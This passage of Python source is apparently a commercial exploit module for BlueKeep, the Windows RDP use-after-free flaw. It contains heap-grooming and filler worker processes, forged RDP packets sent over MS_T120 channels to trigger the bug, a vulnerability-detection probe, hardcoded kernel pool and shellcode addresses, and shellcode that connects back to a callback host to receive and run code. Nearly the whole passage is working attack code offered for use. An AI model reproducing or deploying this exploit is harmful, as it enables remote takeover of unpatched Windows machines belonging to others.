                ret, nr_chunks = rdp.send_data(p1, p2_[proc_index % len(shellcode_parts)], with_flush=False)
                rdp.set_timeout(DFLT_SOCKET_TIMEOUT)
                if ret:
                    logging.error('%s: failed to send data!' % (proc_name))
                    set_status(LWP_STATE_DEAD)
                    return -6, None

                total_nr_chunks += nr_chunks
                groomers_nr_chunks[proc_index] += nr_chunks

                rdp.set_timeout(3)
                ret, _ = rdp.send_input()
                rdp.set_timeout(DFLT_SOCKET_TIMEOUT)
                if ret:
                    logging.error('%s: failed to send the keep-alive! [2]' % (proc_name))
                    set_status(LWP_STATE_DEAD)
                    return -7, None

                time.sleep(0.001)

            status = get_status()
            if status == LWP_STATE_MUST_STOP_GROOMING:
                if not (proc_index % 15):
                    logging.info('%s: ordered to stop grooming' % proc_name)
                break

            # For safety only. Should never be reached
            if status == LWP_STATE_MUST_EXIT:
                logging.warn("%s: ordered to die from an invalid stage! [Race Condition!]" % proc_name)
                set_status(LWP_STATE_DEAD)
                return -10, None

        set_status(LWP_STATE_SYNCING)
        while 1:

            if not (proc_index % 15):
                logging.info("%s: sending a keep-alive [2]" % proc_name)

            for rdp in rdp_array:
                rdp.set_timeout(3)
                ret, _ = rdp.send_input()
                rdp.set_timeout(DFLT_SOCKET_TIMEOUT)
                if ret:
                    logging.error('%s: failed to send the keep-alive! [3]' % (proc_name))
                    set_status(LWP_STATE_DEAD)
                    return -8, None

            # Every seconds, send a keep-alive
            time.sleep(5)

            if get_status() == LWP_STATE_MUST_EXIT:
                if not (proc_index % 15):
                    logging.info("%s: ordered to die!" % proc_name)
                break

        set_status(LWP_STATE_DEAD)
        if not (proc_index % 15):
            logging.info('%s: now ready to die...' % proc_name)
        return 0, []

    except Exception as e:
        logging.error('%s: an unexpected error killed me! (%s)' % (proc_name, str(e)))
        set_status(LWP_STATE_DEAD)
        return -1, None


###
# Helping API
###


def create_channels(with_bug=False):
    '''
    Creates a list of channel.
    If bug is 1, we create the condition to trigger the UAF.
    '''

    chans = []
    chans.append(('rdpdr', CHANNEL_OPTION_INITIALIZED|CHANNEL_OPTION_COMPRESS_RDP|CHANNEL_OPTION_ENCRYPT_RDP))
    chans.append(('rdpsnd', CHANNEL_OPTION_INITIALIZED|CHANNEL_OPTION_COMPRESS_RDP|CHANNEL_OPTION_ENCRYPT_RDP))
    if with_bug:
        chans.append(('MS_T120', 0))
        chans.append(('MS_T120', 0))
        chans.append(('MS_T120', 0))
        chans.append(('MS_T120', 0))
        chans.append(('MS_T120', 0))
    return chans


def __create_tcp_connections(target, port, nr_connections, timeout=DFLT_SOCKET_TIMEOUT, with_wait=False):
    '''
    Attempts (but may fail to do so) to provide 'nr_connections' TCP sockets.
    Returns an array of file descriptors.
    '''

    fd_array = []
    for i in xrange(nr_connections):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target, port))
            s.set_timeout(timeout)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            fd_array.append(s)
            if with_wait:
                time.sleep(0.001)
        except Exception as e:
            s.close()
    return fd_array


def create_tcp_connections(target, port, nr_connections, timeout=DFLT_SOCKET_TIMEOUT):
    '''
    Returns an array of file descriptors.
    '''

    logging.debug("Asking %d connection(s)!" % nr_connections)
    fd_array = []
    no_more = 0

    while 1:

        current_nr_connections = len(fd_array)
        nr_missing_connections = (nr_connections - current_nr_connections)
        current_fd_array = __create_tcp_connections(target, port, nr_missing_connections, timeout=timeout)
        if len(current_fd_array) == 0:
            logging.debug("no more connections")
            if no_more > 9:
                return fd_array
            else:
                no_more += 1

        logging.debug("got %d new connections!" % len(current_fd_array))
        fd_array += current_fd_array

        if len(fd_array) == nr_connections:
            logging.debug("OK, reached the required number of cnx")
            return fd_array


def get_errno():
    '''
    Returns the errno thanks to ctypes.
    '''
    return errno.errorcode[libc.__errno_location().contents.value]


###
# RDP API
###

class HackedRDP(librdp.RDP):

    def __init__(self, socket, username = '', password = '', domain = '', tag=None):
        librdp.RDP.__init__(self, socket, username, password, domain)
        self.old_socket = socket
        self.tag = tag
        self.channel = 0

    ###
    # sockets
    ###

    def get_fd(self):
        '''
        Returns the file descriptor corresponding to a socket object.
        '''
        fileno = getattr(self.old_socket, 'fileno', None)
        if fileno is not None:
            if hasattr(fileno, '__call__'):
                fd = fileno()
            else:
                fd = fileno
        return fd

    def is_remote_alive(self):
        '''
        Allows us to detect broken connections.
        Returns ret, err
        '''

        fd = self.get_fd()
        buf = ARRAY(c_char, 1)()
        result = recv(fd, buf, len(buf), MSG_DONTWAIT|MSG_PEEK)
        if result > 0:
            return True, 'data'
        elif result == 0:
            return False, 'closed'
        else:
            err = get_errno()
            if err == 'EAGAIN':
                return True, 'no data'
            else:
                return False, err

    def flush_data(self, with_packets=False):
        '''
        Flushes the recv pipe.
        '''
        packets = []
        is_alive, reason = self.is_remote_alive()
        while is_alive:
            if reason != 'data':
                break
            logging.debug('flush_data(fd:%d): alive:%d, reason:%s' % (self.get_fd(), is_alive, reason))
            dummy =  self.raw_recv()
            if with_packets:
                packets.append(dummy)
            is_alive, reason = self.is_remote_alive()

        return packets

    ###
    # packets forgery
    ###

    def cr_req_input(self, channel_id, initiator, events=[]):
        '''
        Creates a Client Input Event PDUData (aka slow input).
        Returns None in case of error
        '''

        try:
            cipd = librdp.ClientInputEventPDUData(self.user_channel_id)

            # TODO: An 'event' struct needs to be created.
            cipd['numEvents'] = 1
            cipd['slowPathInputEvents'] =  (('00000000' + '0400' + '0080' + '0f00' + '0000').decode('hex')) * cipd['numEvents'] # keyboard event
            raw_data = cipd.pack()

            if self.selected_protocol == PROTOCOL_RDP:
                encrypted_data = self.encrypt(raw_data)
                hdr = librdp.NonFipsSecurityHeader(SEC_ENCRYPT, self.generate_mac(raw_data))
                raw_data = hdr.pack() + encrypted_data

            sdr = mcs.MCSSendDataRequest(initiator, channel_id)
            sdr.set_payload(raw_data)

            pkt = librdp.RdpPacket()
            pkt.append(librdp.TPKT())
            pkt.append(librdp.x224DataTPDU())
            pkt.append(sdr)
            raw_frame = pkt.pack()
            return raw_frame

        except Exception as e:
            logging.info('cr_req_input: An unexpected error occured: %s' % str(e))
            return None

    ###
    # packets sending API
    ###


    def send_data(self, p1, p2, with_flush=True):

        nr_chunks = 0
        channel = self.channel_ids[1]

        if self.tag:
            p1 = p1.replace('TAG_____', self.tag[:8])

        evil_frame1 = self.get_data_payload(channel, payload = p1)
        if not evil_frame1:
            logging.debug('rdp.get_data_payload() failed!')
            return -1, None

        ready_to_read, ready_to_write, _ = select.select([], [self.socket], [], 2)
        if self.socket not in ready_to_write:
            logging.error('select() says the socket has died')
            return -3, None

        ret = self.socket.send(evil_frame1)
        if ret != len(evil_frame1):
            logging.error('send() could not send the data [1]')
            return -4, None

        nr_chunks += 1
        nr_p2 = 16000 / (len(p2)-8)

        for i in xrange(nr_p2):
            # Because of the RDP encryption we need to generate a new
            # frame each time.
            evil_frame2 = self.get_data_payload(channel, payload = p2)
            if not evil_frame2:
                logging.error('rdp.get_data_payload() failed!')
                return -2, None

            time.sleep(0.001*random.randint(0,9))
            ready_to_read, ready_to_write, _ = select.select([], [self.socket], [], 2)
            if self.socket not in ready_to_write:
                logging.error('select() says the socket has died')
                return -3, None

            ret = self.socket.send(evil_frame2)
            if ret != len(evil_frame2):
                logging.error('send() could not send the data [2]')
                return -4, None

            nr_chunks += 1

        return 0, nr_chunks


    def send_input(self, channel_id=None, initiator=None, events=[], with_flush=False):
        '''
        Sends a Client Input Event PDUData (aka slow input).
        Do not expect any specific answer.
        '''

        global gl_req_input

        if channel_id is None:
            channel_id=self.io_channel_id

        if initiator is None:
            initiator=self.user_channel_id

        logging.debug("send_input(fd:%d)" % self.get_fd())

        try:
            # In the case of TLS/SSL, we can safely cache the input raw frames
            # but we cannot do that with the RDP protocol because of the encryption.
            if self.selected_protocol == PROTOCOL_SSL:
                if gl_req_input.has_key((channel_id,initiator)):
                    raw_frame = gl_req_input[(channel_id,initiator)]
                else:
                    raw_frame = self.cr_req_input(channel_id, initiator, events)
                    gl_req_input[(channel_id,initiator)] = raw_frame
            # RDP
            else:
                raw_frame = self.cr_req_input(channel_id, initiator, events)

            ret = self.socket.send(raw_frame)
            if with_flush:
                self.flush_data()

            return 0, ret

        except Exception as e:
            logging.debug('send_input(fd=%d): An unexpected error occured: %s' % (self.get_fd(), str(e)))
            return -1, None


    def get_data_payload(self, channel_id, payload, initiator=None):
        '''
        Sends data on the faulty channel.
        '''

        if initiator is None:
            initiator=self.user_channel_id

        try:
            sdr = mcs.MCSSendDataRequest(initiator, channel_id)

            if self.selected_protocol == PROTOCOL_RDP:
                encrypted_data = self.encrypt(payload)
                hdr = librdp.NonFipsSecurityHeader(SEC_ENCRYPT, self.generate_mac(payload))
                payload = hdr.pack() + encrypted_data

            sdr.set_payload(payload)
            pkt = librdp.RdpPacket()
            pkt.append(librdp.TPKT())
            pkt.append(librdp.x224DataTPDU())
            pkt.append(sdr)
            return pkt.pack()

        except Exception as e:
            logging.debug('An unexpected error occured: %s' % str(e))
            return None


    def erect_domain2(self):

        global gl_req_erect_domain

        if gl_req_erect_domain:
            raw_frame = gl_req_erect_domain
        else:
            pkt = self.cr_req_erect_domain()
            raw_frame = pkt.pack()
            gl_req_erect_domain = raw_frame

        self.raw_send(raw_frame)
        return 0


    def tls_init(self, vcchunksize=4000, maxreqsize=200, idx=0, victim=False):

        self.set_timeout(DFLT_SOCKET_TIMEOUT)
        cap = self.get_capability(CAPSTYPE_GENERAL, 'extraFlags')
        self.set_capability(CAPSTYPE_GENERAL, 'extraFlags', cap | FASTPATH_OUTPUT_SUPPORTED)
        self.set_capability(CAPSTYPE_VIRTUALCHANNEL, 'VCChunkSize', vcchunksize)
        self.set_capability(CAPSETTYPE_MULTIFRAGMENTUPDATE, 'MaxRequestSize', maxreqsize)

        ret, x = self.connection_request(cookie='Cookie: mstshash=foobar%d' % idx, requestedProtocols=PROTOCOL_SSL)
        if ret:
            logging.error('connection_request() failed!')
            return -1

        selected_protocol, server_flags = x
        if selected_protocol != PROTOCOL_SSL:
            logging.error('connection_request() failed! Server rejected RDP protocol and forced %d instead!' % selected_protocol)
            return -2

        if victim:
            sock = socket.ssl(self.socket, None, None)
            self.socket = sock
        else:
            wrappedSocket = ssl.wrap_socket(self.socket._sock, ssl_version=ssl.PROTOCOL_TLSv1)
            self.socket = wrappedSocket

        return 0


    def rdp_init(self, vcchunksize=4000, maxreqsize=200, idx=0):

        self.set_timeout(DFLT_SOCKET_TIMEOUT)
        cap = self.get_capability(CAPSTYPE_GENERAL, 'extraFlags')
        self.set_capability(CAPSTYPE_GENERAL, 'extraFlags', cap | FASTPATH_OUTPUT_SUPPORTED)
        self.set_capability(CAPSTYPE_VIRTUALCHANNEL, 'VCChunkSize', vcchunksize)
        self.set_capability(CAPSETTYPE_MULTIFRAGMENTUPDATE, 'MaxRequestSize', maxreqsize)

        ret, x = self.connection_request(cookie='Cookie: mstshash=foobar%d' % idx, requestedProtocols=PROTOCOL_RDP)
        if ret:
            logging.error('connection_request() failed!')
            return -1

        selected_protocol, server_flags = x
        if selected_protocol != PROTOCOL_RDP:
            logging.error('connection_request() failed! Server rejected RDP protocol and forced %d instead!' % selected_protocol)
            return -2

        return 0


    def connect(self, vcchunksize=4000, maxreqsize=200, idx=0, with_tls=True, victim=False):
        if with_tls:
            return self.tls_init(vcchunksize=vcchunksize, maxreqsize=maxreqsize, idx=idx, victim=victim)
        else:
            return self.rdp_init(vcchunksize=vcchunksize, maxreqsize=maxreqsize, idx=idx)


    def perform_handcheck(self, with_bug=False):

        if self.selected_protocol == PROTOCOL_SSL:
            return self.perform_fast_handcheck(with_bug)

        try:
            chans = create_channels(with_bug=with_bug)
            ret, x = self.connect_initial(encryption=ENCRYPTION_METHOD_128BIT, channels=chans)
            if ret:
                logging.debug('connect_initial() failed!')
                return -2

            io_channel_id, channel_ids, srandom = x

            ret, _ = self.erect_domain()
            if ret:
                logging.debug('erect_domain() failed!')
                return -3

            ret, x = self.attach_user()
            if ret:
                logging.debug('attach_user() failed!')
                return -4

            # Joining the user_channel_id
            user_channel_id = x[0]
            ret, _ = self.channel_join(channel_id=user_channel_id)
            if ret:
                logging.debug('channel_join(%d) failed!' % user_channel_id)
                return -5

            # Joining the io_channel_id
            ret, _ = self.channel_join(channel_id=io_channel_id)
            if ret:
                logging.debug('channel_join(%d) failed!' % io_channel_id)
                return -6

            # Joining the user-defined channel IDs
            for chan_id in channel_ids:
                ret, _ = self.channel_join(channel_id=chan_id, initiator=user_channel_id, )
                if ret:
                    logging.debug('channel_join(%d) failed!' % chan_id)
                    return -6

            ret, _ = self.sec_exchange(io_channel_id)
            if ret:
                logging.debug('sec_exchange() failed!')
                return -7

            ret, _ = self.client_info(io_channel_id, expect_answer=True)
            if ret:
                logging.debug('client_info() failed!')
                return -8

            ret, _ = self.client_confirm_active(io_channel_id, expect_answer=True)
            if ret:
                logging.debug('client_confirm_active() failed! [ret=%d]' % ret)
                return -9

            ret, _ = self.synchronize(io_channel_id)
            if ret:
                logging.error('synchronize() failed!')
                return -10

            ret, _ = self.control_cooperate(io_channel_id)
            if ret:
                logging.debug('control_cooperate() failed!')
                return -11

            ret, _ = self.control_request_control(io_channel_id, expect_answer=True)
            if ret:
                logging.debug('control_request_control() failed!')
                return -12

            ret, _ = self.persistent_key_list(io_channel_id)
            if ret:
                logging.debug('persistent_key_list() failed!')
                return -13

            ret, _ = self.client_font_list(io_channel_id, expect_answer=False)
            if ret:
                logging.debug('client_font_list() failed!')
                return -14

            return 0

        except Exception as e:
            logging.error("[!] An error occured: %s" % str(e))
            return -1


    def perform_fast_handcheck(self, with_bug=False):

        try:
            chans = create_channels(with_bug=with_bug)
            ret, x = self.connect_initial(encryption=ENCRYPTION_METHOD_NONE, channels=chans)
            if ret:
                logging.debug('connect_initial() failed!')
                return -2

            io_channel_id, channel_ids, srandom = x

            # Erect domain
            self.erect_domain2()

            # Attach User
            ret, x = self.attach_user()
            if ret:
                logging.debug('attach_user() failed!')
                return -4

            # Joining the user_channel_id
            user_channel_id = x[0]
            ret, _ = self.channel_join(channel_id=user_channel_id)
            if ret:
                logging.debug('channel_join(%d) failed!' % user_channel_id)
                return -5

            # Joining the io_channel_id
            ret, _ = self.channel_join(channel_id=io_channel_id)
            if ret:
                logging.debug('channel_join(%d) failed!' % io_channel_id)
                return -6

            # Joining the user-defined channel IDs
            for chan_id in channel_ids:
                ret, _ = self.channel_join(channel_id=chan_id, initiator=user_channel_id)
                if ret:
                    logging.debug('channel_join(%d) failed!' % chan_id)
                    return -6

            # Note: No security exchange with TLS!

            # Client Hello
            ret, x = self.client_info(io_channel_id, user_channel_id)
            if ret:
                return -7

            # Confirm Active
            ret, x = self.client_confirm_active(io_channel_id, user_channel_id)
            if ret:
                return -8

            # synchronize
            ret, x = self.synchronize(io_channel_id, user_channel_id)
            if ret:
                return -9

            # control_cooperate
            ret, x = self.control_cooperate(io_channel_id, user_channel_id)
            if ret:
                return -10

            # control_request_control
            ret, x = self.control_request_control(io_channel_id, user_channel_id)
            if ret:
                return -11

            # persistent_key_list
            ret, x = self.persistent_key_list(io_channel_id, user_channel_id)
            if ret:
                return -12

            # client_font_list
            ret, x = self.client_font_list(io_channel_id, user_channel_id)
            if ret:
                return -13

            return 0

        except Exception as e:
            logging.debug("An error occured: %s" % str(e))
            return -1


###
# CANVAS API
###

class theexploit(canvasexploit, object):

    def __init__(self):
        super(theexploit, self).__init__()

        self.name                 = NAME
        self.port                 = DFLT_RDP_PORT
        self.is_64bit             = True
        self.is_vulnerable        = None
        self.debug                = False
        self.rce_is_allowed       = False
        self.use_tls              = True
        self.amount_ram           = None

        # BlueKeep objects
        self.groomer_threads      = []
        self.filler_threads       = []
        self.tcptimeout           = DFLT_SOCKET_TIMEOUT
        self.nr_groomers          = DFLT_NBR_GROOMERS
        self.nr_fillers           = DFLT_NBR_FILLERS
        self.required_nr_chunks   = DFLT_REQUIRED_NR_CHUNKS_x86
        self.nr_attempts          = 1

    def getArgs(self):
        global X64_POOL_BASE_ADDRESS
        global X64_DISPATCH_TABLE_ADDR
        global X64_SHELLCODE_ADDR

        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        self.debug = bool(int(self.argsDict.get("debug", self.debug)))
        self.rce_is_allowed = bool(int(self.argsDict.get("shell_attempt", self.rce_is_allowed)))
        self.use_tls = bool(int(self.argsDict.get("use_tls", self.use_tls)))

        # for handling custom RAM
        self.amount_ram = int(self.argsDict.get("ram", 4))

        if self.is_64bit:
            self.required_nr_chunks = 300000 * self.amount_ram
            X64_POOL_BASE_ADDRESS   = 0xfffffa8018c00000 + (1024 * 1024) * 375 * self.amount_ram
            X64_DISPATCH_TABLE_ADDR = X64_POOL_BASE_ADDRESS + 0x48
            X64_SHELLCODE_ADDR      = X64_POOL_BASE_ADDRESS + 0x50
            # self.required_nr_chunks = DFLT_REQUIRED_NR_CHUNKS_x64
        else:
            self.required_nr_chunks = DFLT_REQUIRED_NR_CHUNKS_x86

        # Debugging mode
        logger = logging.getLogger()
        if self.debug:
            logger.setLevel(logging.DEBUG)
        else:
            logger.setLevel(logging.INFO)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    ###
    # SHELLCODING API
    ###

    def __create_user_shellcode_x64(self):
        '''
        Generates the userland payload that will be executed from the APC.
        64 bits version.
        '''
        raise RuntimeError('Not implemented! See EternalBlue: shellcode_tag_replace')

    def __create_user_shellcode_x86(self):
        '''
        Generates the userland payload that will be executed from the APC.
        32 bits version.
        '''
        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)
        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval': 0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port'      : self.callback.port,
                                  'ipaddress' : self.callback.ip})
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
        sc.addAttr('ExitThread', None)
        sc.addAttr('ExitProcess', None)
        sc.vAllocSelf = True
        shellcode = sc.get()
        self.shellcode = shellcode
        return shellcode

    def create_user_shellcode(self):
        '''
        Generates the userland payload that will be executed from the APC.
        '''
        if self.is_64bit:
            return self.__create_user_shellcode_x64()
        else:
            return self.__create_user_shellcode_x86()


    ###
    # BlueKeep API
    ###


    def test_disconnect(self, x64_payload=True):
        '''
        Returns True if the target is vulnerable, False otherwise
        '''

        fd_array = create_tcp_connections(self.host, self.port, 3)
        if not len(fd_array):
            logging.error("Cannot create anymore TCP connections! You may rerun the exploit.")
            return -1, None

        fd = fd_array[0]
        rdp = HackedRDP(fd)
        ret = rdp.connect(with_tls=True)
        if ret:
            logging.error("Cannot create an RDP connection! [err=%d]" % ret)
            return -2, None

        ret = rdp.perform_fast_handcheck(with_bug=True)
        if ret:
            rdp.close()
            logging.error("Cannot perform the RDP handcheck![err=%d]" % ret)
            return -3, None

        evil_frame = rdp.get_data_payload(rdp.channel_ids[5], payload = self.get_evil_payload(x64_payload=x64_payload))
        shutdown_packet = '0300000902f0802180'.decode('hex')

        ret = False
        for i in xrange(3):
            pkts = rdp.flush_data(with_packets = True)
            rdp.socket.send(evil_frame)
            dummy = rdp.raw_recv()
            if dummy == shutdown_packet or shutdown_packet in pkts:
                ret = True
                break

        rdp.close()
        return 0, ret

    def create_victim(self):
        '''
        Creates the RDP connection for the victim.
        '''

        fd_array = create_tcp_connections(self.host, self.port, 10)
        if not len(fd_array):
            logging.error("Cannot create anymore TCP connections! You may rerun the exploit.")
            return -1, None

        fd_victim = fd_array[0]
        rdp_victim = HackedRDP(fd_victim)
        ret = rdp_victim.connect(with_tls=True, victim=True)
        if ret:
            logging.error("Cannot create an RDP connection! You may rerun the exploit. [err=%d]" % ret)
            return -2, None

        ret = rdp_victim.perform_fast_handcheck(with_bug=True)
        if ret:
            rdp_victim.close()
            logging.error("Cannot perform the RDP handcheck! You may rerun the exploit. [err=%d]" % ret)
            return -2, None

        return 0, rdp_victim

    def get_evil_payload(self, x64_payload=True):
        '''
        Provides the data part of the packet triggering the disconnection of a given virtualchannel.
        Format is: [ length ] [ flags ] [ data ]
        In case length does not match the effective length of the payload, the channel is closed without
        actually breaking the connection which provides a way to trigger the UAF.
        If the length matches however, depending on whether the packet is valid or not, a specific packet
        will be sent by the server allowing us to detect both if the target is vulnerable and its architecture
        at the same time!
        '''

        if x64_payload:
            return '20000000030000000000000000000000020000000000000000000000000000000000000000000000'.decode('hex')
        else:
            return '100000000300000000000000020000000000000000000000'.decode('hex')


    def create_groomers_as_lwp(self, nr_expected_groomers, with_tls=True):
        '''
        Creates an array of running lwp responsible for heap spreading.
        '''

        global groomers_state

        args = {}
        args['host'] = self.host
        args['port'] = self.port
        args['nr_connections'] = 1
        args['nr_expected_chunks'] = 50000 # Arbitrary large amount

        groomer_pool = Pool(processes=nr_expected_groomers, initializer=init_groomer, initargs=(groomers_lock, args,))
        groomer_resp = [ groomer_pool.apply_async(start_groomer, (lwp_idx, with_tls)) for lwp_idx in xrange(nr_expected_groomers) ]

        while 1:

            nr_deads = 0
            nr_alive = 0
            nr_syncing = 0
            groomers_lock.acquire()
            for i in xrange(nr_expected_groomers):
                if groomers_state[i] == LWP_STATE_DEAD:
                    nr_deads += 1
                elif groomers_state[i] == LWP_STATE_ALIVE:
                    nr_alive += 1
                elif groomers_state[i] == LWP_STATE_SYNCING:
                    nr_syncing += 1
            groomers_lock.release()

            if (nr_syncing + nr_deads) == nr_expected_groomers:
                break

            logging.info('%d/%d are syncing' % (nr_syncing, nr_expected_groomers))
            time.sleep(0.1)

        logging.info('%d Groomer(s) were successfully created!' % nr_syncing)
        return nr_syncing, nr_deads, groomer_pool, groomers_lock, groomer_resp


    def create_fillers_as_lwp(self, nr_expected_fillers):
        '''
        Creates an array of running threads responsible for the allocation
        of the vulnerable (UAF) chunk.
        '''

        global fillers_state

        args = {}
        args['host'] = self.host
        args['port'] = self.port
        args['nr_connections'] = 1

        fillers_pool = Pool(processes=nr_expected_fillers, initializer=init_filler, initargs=(fillers_lock, args,))
        fillers_resp = [ fillers_pool.apply_async(start_filler, (lwp_idx,)) for lwp_idx in xrange(nr_expected_fillers) ]

        while 1:

            nr_deads = 0
            nr_alive = 0
            nr_syncing = 0
            fillers_lock.acquire()
            for i in xrange(nr_expected_fillers):
                if fillers_state[i] == LWP_STATE_DEAD:
                    nr_deads += 1
                elif fillers_state[i] == LWP_STATE_ALIVE:
                    nr_alive += 1
                elif fillers_state[i] == LWP_STATE_SYNCING:
                    nr_syncing += 1
            fillers_lock.release()

            if (nr_syncing + nr_deads) == nr_expected_fillers:
                break

            logging.info('%d/%d are syncing' % (nr_syncing, nr_expected_fillers))
            time.sleep(0.1)

        logging.info('%d Filler(s) were successfully created!' % nr_syncing)
        return nr_syncing, nr_deads, fillers_pool, fillers_lock, fillers_resp


    def terminate_lwp(self, pool, resp, state, lock):
        '''
        Forces the LWP of a group to quit (safely).
        '''

        lock.acquire()
        for i in xrange(len(state)):
            # Note: It does not matter if we taint more than required.
            if state[i] != LWP_STATE_DEAD:
                state[i] = LWP_STATE_MUST_EXIT
        lock.release()

        for r in resp:
            r.wait()

        pool.close()
        pool.join()
        return


    ###
    # MAIN API
    ###


    def init_shared_memory(self):
        '''
        Initialize all the shared memory to 0.
        '''
        for i in xrange(len(groomers_nr_chunks)):
            groomers_nr_chunks[i] = 0
        for i in xrange(len(groomers_state)):
            groomers_state[i] = 0
        for i in xrange(len(fillers_state)):
            fillers_state[i] = 0


    def exploit(self):
        '''
        The main function. Probably needs a little bit of refactorization ;>.
        Note: Currently not perfect thread wise as we fail to correctly end the threads sometimes.
        '''

        self.nr_attempts -= 1
        self.init_shared_memory()

        logging.info('Attempting to create %d HeapGroomer(s) each handling %d RDP connections' % (self.nr_groomers, 1))
        nr_groomers_syncing, nr_groomers_dead, groomers_pool, groomers_lock, groomers_resp = self.create_groomers_as_lwp(self.nr_groomers, with_tls=self.use_tls)
        if not nr_groomers_syncing:
            logging.error('create_groomers_as_lwp() failed, giving up!')
            self.terminate_lwp(groomers_pool, groomers_resp, groomers_state, groomers_lock)
            return 0

        logging.info('Created %d groomer(s) (%d are alive)' % (self.nr_groomers, nr_groomers_syncing))
        time.sleep(3)

        logging.info('Attempting to create %d ChunkFiller(s) each handling %d RDP/TLS connections' % (self.nr_fillers, 1))
        nr_fillers_syncing, nr_fillers_dead, fillers_pool, fillers_lock, fillers_resp = self.create_fillers_as_lwp(self.nr_fillers)

        if not nr_fillers_syncing:
            logging.error('create_fillers_as_lwp() failed, giving up!')
            self.terminate_lwp(groomers_pool, groomers_resp, groomers_state, groomers_lock)
            self.terminate_lwp(fillers_pool, fillers_resp, fillers_state, fillers_lock)
            return 0

        logging.info('Created %d filler(s) (%d are alive)' % (self.nr_fillers, nr_fillers_syncing))

        last_number_of_chunks = 0
        initial_number_of_groomers = nr_groomers_syncing

        logging.info('Grooming (threshold: %dk)' % (self.required_nr_chunks/1000))

        groomers_lock.acquire()
        for i in xrange(self.nr_groomers):
            if groomers_state[i] == LWP_STATE_SYNCING:
                groomers_state[i] = LWP_STATE_MUST_START_GROOMING
        groomers_lock.release()

        total_number_of_chunks = 0
        old_total_number_of_chunks = 0
        time_spent = 0
        while total_number_of_chunks < self.required_nr_chunks:

            total_number_of_chunks = sum(groomers_nr_chunks)
            logging.info("Current number of chunks after %d secs is %d [%d %%]" % (time_spent, total_number_of_chunks, int(100*float(total_number_of_chunks)/float(self.required_nr_chunks))))
            logging.info("Round progress: %d" % (total_number_of_chunks - old_total_number_of_chunks))
            time.sleep(GROOMING_TIME_SLICE)
            time_spent += GROOMING_TIME_SLICE
            old_total_number_of_chunks = total_number_of_chunks

            # Security check. If there is no more progress, we stop.
            if sum(groomers_nr_chunks) and sum(groomers_nr_chunks) == total_number_of_chunks:
                logging.error('The grooming is too slow, giving up!')
                self.terminate_lwp(groomers_pool, groomers_resp, groomers_state, groomers_lock)
                self.terminate_lwp(fillers_pool, fillers_resp, fillers_state, fillers_lock)
                return 0

        logging.info('Grooming is over!')

        groomers_lock.acquire()
        for i in xrange(self.nr_groomers):
            if groomers_state[i] == LWP_STATE_GROOMING:
                groomers_state[i] = LWP_STATE_MUST_STOP_GROOMING
        groomers_lock.release()

        # Creating the victim
        logging.info("Creating the victim to fill one of the holes")

        rdp_victim = None
        for i in xrange(5):
            ret, rdp_victim = self.create_victim()
            if not ret:
                logging.info("Successfully created the victim!")
                break

        if not rdp_victim:
            logging.info('It seems we saturated the memory!')
            self.required_nr_chunks /= 2
            self.nr_attempts += 1
            self.terminate_lwp(groomers_pool, groomers_resp, groomers_state, groomers_lock)
            self.terminate_lwp(fillers_pool, fillers_resp, fillers_state, fillers_lock)
            time.sleep(3)
            return 0

        # Creation of the payload triggering the bug.
        evil_frame = rdp_victim.get_data_payload(rdp_victim.channel_ids[5], payload = self.get_evil_payload(x64_payload=self.is_64bit)[:-2])

        # Fillers need to start filling!
        fillers_lock.acquire()
        for i in xrange(self.nr_fillers):
            if fillers_state[i] == LWP_STATE_SYNCING:
                fillers_state[i] = LWP_STATE_MUST_START_FILLING
        fillers_lock.release()

        # To be sure to win the race, we need to be sure that the data are being sent right now.
        time.sleep(2)

        logging.info("Sending the order to free the channel")
        rdp_victim.socket.send(evil_frame) # To get EAX control
        #rdp_victim.close()                # To debug (no crash)

        # Chunk replacement
        time.sleep(3)
        logging.info("Closing the connection")
        rdp_victim.close() # This (should) trigger the shell!

        # Now we need to be a little bit patient as the egghunter is looking
        # for the shellcode parts in memory.
        logging.info('Waiting 3s before cleaning the heap!')
        time.sleep(3)

        # Assuming the job is done, the filler must now be in sync mode again

        logging.info('Stopping the filling')
        fillers_lock.acquire()
        for i in xrange(self.nr_fillers):
            if fillers_state[i] == LWP_STATE_FILLING:
                fillers_state[i] = LWP_STATE_MUST_STOP_FILLING
        fillers_lock.release()

        time.sleep(2)

        logging.info('Attempting to end the LWP')
        self.terminate_lwp(groomers_pool, groomers_resp, groomers_state, groomers_lock)
        self.terminate_lwp(fillers_pool, fillers_resp, fillers_state, fillers_lock)

        logging.info("Waiting for the shell")
        return 1


    def run(self):

        global current_target

        self.getArgs()
        librdp.set_debug_level(RDP_LOG_NONE)
        logging.info('Running exploit against %s:%s' % (self.host, self.port))

        # test() actually calls detect_arch()
        try:
            if not self.test():
                logging.info('%s attacking %s:%d (failed): The target does not appear to be vulnerable!' % (self.name, self.host, self.port))
                logging.error('%s done (failed)' % (self.name))
                self.setProgress(100)
                self.clean()
                return 0
        except ssl.SSLError:
            logging.info('%s attacking %s:%d (failed): The target is likely to be Windows 7 SP0 or earlier (unsupported)!' % (self.name, self.host, self.port))
            logging.error('%s done (failed)' % (self.name))
            self.setProgress(100)
            self.clean()
            return 0

        version = self.detect_windows_version()
        if version not in ["unknown", "not windows"]:
            logging.info('Windows %s was detected' % version)

        if version == '2008' or version == '2008 R2':
            logging.error('Windows 2008 (R2) is not supported for now.')
            logging.error('%s done (failed)' % (self.name))
            self.setProgress(100)
            self.clean()
            return 0

        if not self.rce_is_allowed:
            logging.info('%s attacking %s:%d (failed): RCE attempts are not allowed' % (self.name, self.host, self.port))
            logging.error('%s done (failed)' % (self.name))
            self.setProgress(100)
            self.clean()
            return 0

        # For now we need to be careful. So we add 2 extra checks.
        node = self.argsDict["passednodes"][0]
        _type    = node.nodetype

        # Theoretically this should work on distant Unix hosts but we cannot be sure
        # it is tested.
        if not isinstance(node, localNode):
